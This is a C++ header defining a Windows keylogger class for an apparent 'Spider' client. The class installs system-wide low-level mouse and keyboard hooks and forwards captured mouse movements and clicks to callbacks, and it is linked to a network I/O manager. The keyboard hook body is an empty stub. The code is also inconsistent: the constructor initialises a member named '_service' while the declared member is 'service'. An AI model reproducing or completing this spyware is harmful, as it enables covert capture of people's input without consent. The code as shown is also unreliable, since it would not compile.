//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_WINKEYLOGGER_HPP
#define SPIDER_CLIENT_WINKEYLOGGER_HPP

#include <memory>
#include <utility>
#include <WindowsX.h>
#include <utils/Config.hpp>
#include <Network/IOManager.hpp>
#include "LazySingleton.hpp"
#include "KeyLogger.hpp"

namespace spi
{
    class WinKeyLogger : public KeyLogger, public utils::LazySingleton<WinKeyLogger>
    {
    public:
        explicit WinKeyLogger(net::IOManager &service) : _service(service)
        {}

        ~WinKeyLogger() override = default;

        void setup() override
        {
            WinKeyLogger::getInstance().setupHooks();
        }

        static LRESULT CALLBACK

        MouseHookProc(int code, WPARAM wParam, LPARAM lParam)
        {
            WinKeyLogger::getInstance().MouseHook(code, wParam, lParam);
            return CallNextHookEx(nullptr, code, wParam, lParam);
        }

        void MouseHook(int nCode, WPARAM wParam, LPARAM lParam)
        {
            if (nCode != HC_ACTION) {
                return;
            }
            switch (wParam) {
                case WM_MOUSEMOVE: {
                    spi::proto::MouseMove mouseMove;

                    mouseMove.x = GET_X_LPARAM(lParam);
                    mouseMove.y = GET_Y_LPARAM(lParam);
                    mouseMove.timestamp = std::chrono::steady_clock::now();
                    getInstance()._mouseMoveCallback(std::move(mouseMove));
                }
                    break;
                case WM_MBUTTONDOWN:
                case WM_RBUTTONDOWN:
                case WM_LBUTTONDOWN:
                case WM_LBUTTONUP:
                case WM_RBUTTONUP:
                case WM_MBUTTONUP: {
                    spi::proto::MouseClick event;

                    event.x = GET_X_LPARAM(lParam);
                    event.y = GET_Y_LPARAM(lParam);
                    event.timestamp = std::chrono::steady_clock::now();
                    switch (wParam) {
                        case WM_MBUTTONUP:
                        case WM_LBUTTONUP:
                        case WM_RBUTTONUP:
                            event.state = proto::KeyState::Up;
                            break;

                        case WM_RBUTTONDOWN:
                        case WM_LBUTTONDOWN:
                        case WM_MBUTTONDOWN:
                            event.state = proto::KeyState::Down;
                            break;
                    }
                    switch (wParam) {
                        case WM_MBUTTONDOWN:
                        case WM_MBUTTONUP:
                            event.button = spi::proto::MouseButton::Middle;
                            break;
                        case WM_RBUTTONUP:
                        case WM_RBUTTONDOWN:
                            event.button = spi::proto::MouseButton::Right;
                            break;
                        case WM_LBUTTONUP:
                        case WM_LBUTTONDOWN:
                            event.button = spi::proto::MouseButton::Left;
                            break;
                    }
                    getInstance()._mouseClickCallback(std::move(event));
                }
                    break;
            }
        }

        void KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
        {
            if (nCode != HC_ACTION) {
                return;
            }
        }

        static LRESULT CALLBACK

        KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam)
        {
            WinKeyLogger::getInstance().KeyboardHook(code, wParam, lParam);
            return CallNextHookEx(nullptr, code, wParam, lParam);
        }

        void setupHooks()
        {
            _mouseHook = SetWindowsHookEx(WH_MOUSE_LL, &MouseHookProc, nullptr, 0);
            _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHookProc, nullptr, 0);
        }

        void run() override
        {
            setupHooks();
        }

        void stop() override
        {
            UnhookWindowsHookEx(_mouseHook);
            UnhookWindowsHookEx(_keyboardHook);
        }

    private:
        net::IOManager &service;
        HHOOK _keyboardHook{};
        HHOOK _mouseHook{};
    };
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
    {
        return std::make_unique<WinKeyLogger>(service);
    }
}

#endif //SPIDER_CLIENT_WINKEYLOGGER_HPP
